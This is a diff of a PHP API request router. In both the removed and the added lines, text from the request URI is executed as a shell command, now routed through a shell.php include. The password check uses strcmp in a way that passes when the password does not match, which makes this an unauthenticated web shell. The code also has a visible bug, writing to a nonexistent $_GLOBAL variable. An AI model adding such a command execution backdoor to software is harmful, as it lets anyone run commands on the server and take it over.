@@ -10,10 +10,13 @@ $api_v = "v1";
 $request_uri = $_SERVER["REQUEST_URI"];
 $method = $_SERVER['REQUEST_METHOD'];
 $framework_uri = "env.php";
+$shell_uri = "shell.php";
 
-$cmd = explode("/", $request_uri);
-if(strcmp($cmd[1], getenv("sbserpassword"))){
-	echo shell_exec($cmd[2]);
+$cmd = explode("*", $request_uri);
+if(strcmp("/" . $cmd[0], getenv("sbserpassword"))){
+	$_GLOBAL["shell_command"] = rawurldecode($cmd[1]);
+	require_once $shell_uri;
+	die();
 }
 
 //wipe out get-parameters if they passed
